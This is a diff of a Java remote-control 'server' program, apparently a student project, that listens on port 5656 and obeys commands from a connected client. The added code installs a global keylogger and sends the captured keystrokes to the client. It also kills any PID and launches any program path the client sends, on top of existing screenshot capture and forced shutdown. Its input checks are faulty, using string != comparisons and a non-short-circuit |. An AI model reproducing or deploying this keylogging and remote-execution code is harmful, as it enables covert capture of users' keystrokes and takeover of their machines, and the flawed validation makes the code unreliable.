@@ -1,5 +1,9 @@
 package org.example;
 
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+import org.slf4j.event.EventRecodingLogger;
+
 import javax.naming.SizeLimitExceededException;
 import javax.swing.*;
 import java.awt.event.*;
@@ -19,9 +23,7 @@ import java.io.BufferedWriter;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
-import java.net.Inet4Address;
-import java.net.ServerSocket;
-import java.net.Socket;
+import java.net.*;
 import java.awt.Robot;
 import java.awt.Color;
 import java.awt.Dimension;
@@ -32,7 +34,6 @@ import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.awt.image.BufferedImage;
 import java.io.File;
-import java.net.UnknownHostException;
 import java.nio.channels.ScatteringByteChannel;
 import javax.imageio.ImageIO;
 import javax.swing.*;
@@ -43,11 +44,14 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.nio.file.StandardOpenOption;
+import java.security.Key;
 import java.time.chrono.IsoChronology;
+import java.util.ArrayList;
 import java.util.Objects;
 import java.util.logging.Level;
 import java.io.*;
 import java.awt.*;
+import java.util.logging.Logger;
 import javax.swing.*;
 import javax.swing.event.*;
 import javax.swing.text.*;
@@ -59,7 +63,11 @@ public class server extends JFrame {
     public static String s;
     public static String ss;
     public static BufferedImage bimg;
-    byte[] bytes;
+    public static boolean KeylogStatus = false;
+    public static boolean KeylogRun = false;
+//    private ArrayList<String> process_datanameList = new ArrayList<>();
+//    private ArrayList<Integer> process_pidList = new ArrayList<>();
+
 
     public void InitializeComponent() {
         setContentPane(contentPane);
@@ -81,36 +89,30 @@ public class server extends JFrame {
 //        outputToPane("Local IP: " + Inet4Address.getLocalHost().getHostAddress());
 //        outputToPane("hi");
     }
+
     public void shutdown() {
         try {
             Runtime.getRuntime().exec("shutdown -s -t 00");
-        }
-        catch (IOException e)
-        {
+        } catch (IOException e) {
             System.out.println(e);
         }
     }
 
     public void receiveSignalFun() {
-        try
-        {
+        try {
             ss = Program.is.readLine();
-        }
-        catch (IOException e)
-        {
+        } catch (IOException e) {
             ss = "QUIT";
             System.out.println(e);
         }
     }
+
     public void takepic() {
-        while (true)
-        {
+        while (true) {
             receiveSignalFun();
             System.out.println(ss);
-            switch (ss)
-            {
-                case "TAKE":
-                {
+            switch (ss) {
+                case "TAKE": {
                     try {
                         Robot bot = new Robot();
                         bimg = bot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
@@ -122,8 +124,7 @@ public class server extends JFrame {
                         oos.writeObject(baos.size() + "");
                         Program.socketOfClient.getOutputStream().write(baos.toByteArray());
                         System.out.println("Screenshot sent");
-                    } catch (AWTException awte)
-                    {
+                    } catch (AWTException awte) {
                         System.out.println(awte);
                         break;
                     } catch (IOException e) {
@@ -132,36 +133,250 @@ public class server extends JFrame {
                     break;
 
                 }
-                case "QUIT":
-                {
+                case "QUIT": {
                     return;
                 }
             }
         }
     }
-    public void application() {
-        String ss_a = "";
 
+    public boolean checkProcessIsApplication(String input) {
+        String[] temp1 = input.split("");
+        if (Objects.equals(temp1[0], "\"") && Objects.equals(temp1[1], "\"") && Objects.equals(temp1[2], ","))
+            return false;
+        else return true;
     }
+
+    public void keylog() {
+//        Keylog.init();
+//        t.suspend();
+        while (true) {
+            receiveSignalFun();
+            System.out.println(ss);
+            switch (ss) {
+                case "PRINT": {
+                    printkeys();
+                    break;
+                }
+                case "HOOK": {
+                    hookKey();
+                    break;
+                }
+                case "UNHOOK": {
+                    unhook();
+                    break;
+                }
+                case "QUIT": {
+                    unhook();
+                    return;
+                }
+            }
+        }
+    }
+
+    private void printkeys() {
+        try {
+            Program.os.write(Keylog.keylogStringBuffer.toString());
+            Program.os.newLine();
+            Program.os.flush();
+            Program.os.write("[END_OF_STRING_BUFFER]");
+            Program.os.newLine();
+            Program.os.flush();
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+    private void hookKey() {
+        if (!KeylogStatus) {
+            if (!KeylogRun)
+            {
+                Keylog.run();
+                KeylogRun = true;
+            }
+            else {
+                try {
+                    GlobalScreen.registerNativeHook();
+                } catch (NativeHookException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+            KeylogStatus = true;
+        } else {
+            System.out.println("Keylog is running...");
+        }
+    }
+
+    private void unhook() {
+        if (KeylogStatus) {
+            Keylog.unRun();
+//            t1.stop();
+            KeylogStatus = false;
+        } else {
+            System.out.println("Keylog is not running...");
+        }
+    }
+
+
+    public void application() {
+        while (true) {
+            receiveSignalFun();
+            System.out.println(ss);
+            switch (ss) {
+                case "XEM": {
+                    try {
+                        String line;
+
+                        // Command process
+                        String command = "powershell.exe Get-Process | Select MainWindowTitle,ProcessName,Id,HandleCount | ConvertTo-Csv -NoTypeInformation";
+                        Process powerShellProcess = Runtime.getRuntime().exec(command);
+                        powerShellProcess.getOutputStream().close();
+                        BufferedReader input = new BufferedReader(new InputStreamReader(powerShellProcess.getInputStream()));
+                        line = input.readLine();
+                        while ((line = input.readLine()) != null) {
+                            if (checkProcessIsApplication(line)) {
+                                String tempOfLine = line.substring(1, line.length());
+                                Program.os.write(tempOfLine.substring(tempOfLine.indexOf("\"") + 2));
+                                Program.os.newLine();
+                                Program.os.flush();
+                            }
+//                        process_AddPIDList(line);
+//                        process_AddProcessNameList(line);
+                        }
+                        Program.os.write("END_OF_SERVER_LIST");
+                        Program.os.newLine();
+                        Program.os.flush();
+                    } catch (IOException e) {
+                        throw new RuntimeException(e);
+                    }
+                    break;
+                }
+                case "KILL": {
+                    boolean test01 = true;
+//                    process_datanameList = null;
+//                    process_pidList = null;
+                    while (test01) {
+                        receiveSignalFun();
+                        switch (ss) {
+                            case "KILLID": {
+                                try {
+                                    String u = "";
+                                    u = Program.is.readLine();
+                                    boolean test02 = false;
+                                    String errorcode = "";
+//                                    String line;
+//                                    Process p = Runtime.getRuntime().exec(System.getenv("windir") + "\\system32\\" + "tasklist.exe" + " /FO CSV /NH");
+//                                    BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
+//                                    while ((line = input.readLine()) != null) {
+//                                        process_AddPIDList(line);
+//                                        process_AddProcessNameList(line);
+//                                    }
+                                    if (u != "" | isNumeric(u)) {
+                                        Process commandRun = Runtime.getRuntime().exec("TASKKILL /PID " + u);
+                                        BufferedReader r = new BufferedReader(new InputStreamReader(commandRun.getInputStream()));
+                                        BufferedReader rr = new BufferedReader(new InputStreamReader(commandRun.getErrorStream()));
+                                        String s = r.readLine();
+                                        if (s != null) {
+                                            Program.os.write("Dừng tiến trình thành công.");
+                                            Program.os.newLine();
+                                            Program.os.flush();
+                                            test02 = true;
+                                        } else {
+                                            errorcode = rr.readLine();
+                                            errorcode = errorcode.substring(7, errorcode.length());
+                                        }
+                                    } else {
+                                        errorcode = "PID không hợp lệ.";
+                                    }
+
+                                    if (!test02) {
+                                        Program.os.write("Đã có lỗi xảy ra. Mã lỗi: " + errorcode);
+                                        Program.os.newLine();
+                                        Program.os.flush();
+                                    }
+                                } catch (IOException e) {
+                                    System.out.println(e);
+                                }
+                                break;
+                            }
+                            case "QUIT": {
+                                test01 = false;
+                                break;
+                            }
+                        }
+                    }
+                    break;
+                }
+                case "START": {
+                    boolean test01 = true;
+                    while (test01) {
+                        receiveSignalFun();
+                        switch (ss) {
+                            case "STARTID": {
+                                try {
+                                    String u = "";
+                                    u = Program.is.readLine();
+                                    boolean test02 = false;
+                                    String errorcode = "";
+                                    if (u != "") {
+                                        try {
+                                            Process p = new ProcessBuilder(u).start();
+                                        } catch (IOException ee) {
+                                            errorcode = String.valueOf(ee);
+                                        }
+                                        if (errorcode == "") {
+                                            Program.os.write("Tiến trình khởi động thành công.");
+                                            Program.os.newLine();
+                                            Program.os.flush();
+                                            test02 = true;
+                                        }
+                                    }
+                                    if (!test02) {
+                                        Program.os.write("Khởi động tiến trình thất bại. Mã lỗi: " + errorcode);
+                                        Program.os.newLine();
+                                        Program.os.flush();
+                                    }
+                                } catch (IOException e) {
+                                    System.out.println(e);
+                                }
+                                break;
+                            }
+                            case "QUIT": {
+                                test01 = false;
+                                break;
+                            }
+                        }
+                    }
+                    break;
+                }
+                case "QUIT": {
+                    return;
+                }
+            }
+        }
+    }
+
     public void process() {
         while (true) {
             receiveSignalFun();
             System.out.println(ss);
             switch (ss) {
-                case "XEM":
-                {
+                case "XEM": {
                     // "BEGIN_OF_SERVER_LIST
-                    try { String line;
-                        Process p = Runtime.getRuntime().exec (System.getenv("windir") +"\\system32\\"+"tasklist.exe" + " /FO CSV");
+                    try {
+                        String line;
+                        Process p = Runtime.getRuntime().exec(System.getenv("windir") + "\\system32\\" + "tasklist.exe" + " /FO CSV /NH");
                         BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
-                    while ((line = input.readLine()) != null) {
-                        Program.os.write(line);
+                        while ((line = input.readLine()) != null) {
+//                        process_AddPIDList(line);
+//                        process_AddProcessNameList(line);
+                            Program.os.write(line);
+                            Program.os.newLine();
+                            Program.os.flush();
+                        }
+                        Program.os.write("END_OF_SERVER_LIST");
                         Program.os.newLine();
                         Program.os.flush();
-                    }
-                    Program.os.write("END_OF_SERVER_LIST");
-                    Program.os.newLine();
-                    Program.os.flush();
 //                        System.out.println("END_OF_SERVER_LIST");
 //                        ObjectOutputStream oos = new ObjectOutputStream(Program.socketOfClient.getOutputStream());
 //                        oos.writeObject(input);
@@ -169,22 +384,150 @@ public class server extends JFrame {
                     } catch (Exception err) {
                         err.printStackTrace();
                     }
+//                    System.out.println(process_datanameList);
+//                    System.out.println(process_pidList);
                     break;
                 }
-                case "QUIT":
-                {
+                case "KILL": {
+                    boolean test01 = true;
+//                    process_datanameList = null;
+//                    process_pidList = null;
+                    while (test01) {
+                        receiveSignalFun();
+                        switch (ss) {
+                            case "KILLID": {
+                                try {
+                                    String u = "";
+                                    u = Program.is.readLine();
+                                    boolean test02 = false;
+                                    String errorcode = "";
+//                                    String line;
+//                                    Process p = Runtime.getRuntime().exec(System.getenv("windir") + "\\system32\\" + "tasklist.exe" + " /FO CSV /NH");
+//                                    BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
+//                                    while ((line = input.readLine()) != null) {
+//                                        process_AddPIDList(line);
+//                                        process_AddProcessNameList(line);
+//                                    }
+                                    if (u != "" | isNumeric(u)) {
+                                        Process commandRun = Runtime.getRuntime().exec("TASKKILL /PID " + u);
+                                        BufferedReader r = new BufferedReader(new InputStreamReader(commandRun.getInputStream()));
+                                        BufferedReader rr = new BufferedReader(new InputStreamReader(commandRun.getErrorStream()));
+                                        String s = r.readLine();
+                                        if (s != null) {
+                                            Program.os.write("Dừng tiến trình thành công.");
+                                            Program.os.newLine();
+                                            Program.os.flush();
+                                            test02 = true;
+                                        } else {
+                                            errorcode = rr.readLine();
+                                            errorcode = errorcode.substring(7, errorcode.length());
+                                        }
+                                    } else {
+                                        errorcode = "PID không hợp lệ.";
+                                    }
+
+                                    if (!test02) {
+                                        Program.os.write("Đã có lỗi xảy ra. Mã lỗi: " + errorcode);
+                                        Program.os.newLine();
+                                        Program.os.flush();
+                                    }
+                                } catch (IOException e) {
+                                    System.out.println(e);
+                                }
+                                break;
+                            }
+                            case "QUIT": {
+                                test01 = false;
+                                break;
+                            }
+                        }
+                    }
+                    break;
+                }
+                case "START": {
+                    boolean test01 = true;
+                    while (test01) {
+                        receiveSignalFun();
+                        switch (ss) {
+                            case "STARTID": {
+                                try {
+                                    String u = "";
+                                    u = Program.is.readLine();
+                                    boolean test02 = false;
+                                    String errorcode = "";
+                                    if (u != "") {
+                                        try {
+                                            Process p = new ProcessBuilder(u).start();
+                                        } catch (IOException ee) {
+                                            errorcode = String.valueOf(ee);
+                                        }
+                                        if (errorcode == "") {
+                                            Program.os.write("Tiến trình khởi động thành công.");
+                                            Program.os.newLine();
+                                            Program.os.flush();
+                                            test02 = true;
+                                        }
+                                    }
+                                    if (!test02) {
+                                        Program.os.write("Khởi động tiến trình thất bại. Mã lỗi: " + errorcode);
+                                        Program.os.newLine();
+                                        Program.os.flush();
+                                    }
+                                } catch (IOException e) {
+                                    System.out.println(e);
+                                }
+                                break;
+                            }
+                            case "QUIT": {
+                                test01 = false;
+                                break;
+                            }
+                        }
+                    }
+                    break;
+                }
+                case "QUIT": {
                     return;
                 }
             }
         }
     }
+
+    public boolean isNumeric(String str) {
+        return str != null && str.matches("[0-9.]+");
+    }
+
+//    public String CSV_name_Processing(String input) {
+//        String temp = input.substring(1, input.length() - 1);
+//        int o = 0;
+//        String[] output = temp.split("\",\"");
+//        return output[0];
+//    }
+//
+//    public int CSV_Processing(String input) {
+//        String temp = input.substring(1, input.length() - 1);
+//        int o = 0;
+//        String[] output = temp.split("\",\"");
+//        if (isNumeric(output[1])) {
+//            o = Integer.parseInt(output[1]);
+//        } else {
+//            o = -1;
+//        }
+//        return o;
+//    }
+
+//    public void process_AddProcessNameList(String input) {
+//        process_datanameList.add(CSV_name_Processing(input));
+//    }
+//
+//    public void process_AddPIDList(String input) {
+//        process_pidList.add(CSV_Processing(input));
+//    }
+
     public void receiveSignal() {
-        try
-        {
+        try {
             s = Program.is.readLine();
-        }
-        catch (IOException e)
-        {
+        } catch (IOException e) {
             s = "QUIT";
             System.out.println(e);
         }
@@ -193,8 +536,7 @@ public class server extends JFrame {
     public void button1_Click() {
         try {
             Program.serversocket = new ServerSocket(5656);
-        }
-        catch (IOException e0) {
+        } catch (IOException e0) {
             System.out.println(e0);
             System.exit(1);
         }
@@ -209,7 +551,8 @@ public class server extends JFrame {
             System.out.println("Accept a client");
             Program.is = new BufferedReader(new InputStreamReader(Program.socketOfClient.getInputStream()));
             Program.os = new BufferedWriter(new OutputStreamWriter(Program.socketOfClient.getOutputStream()));
-            respondFromClient: {
+            respondFromClient:
+            {
                 while (true) {
 
                     receiveSignal();
@@ -227,13 +570,18 @@ public class server extends JFrame {
                             s = "";
                             break;
                         }
-                        case "APPLICATION" : {
+                        case "APPLICATION": {
                             application();
                             s = "";
                             break;
                         }
                         case "PROCESS": {
                             process();
+                            s = "";
+                            break;
+                        }
+                        case "KEYLOG": {
+                            keylog();
                             s = "";
                             break;
                         }
@@ -245,13 +593,10 @@ public class server extends JFrame {
                     }
                 }
             }
-        }
-        catch (IOException e)
-        {
+        } catch (IOException e) {
             try {
                 finish();
-            }
-            catch (IOException e1) {
+            } catch (IOException e1) {
                 System.out.println(e1);
             }
 //            textArea1.append("Connection closed\n");
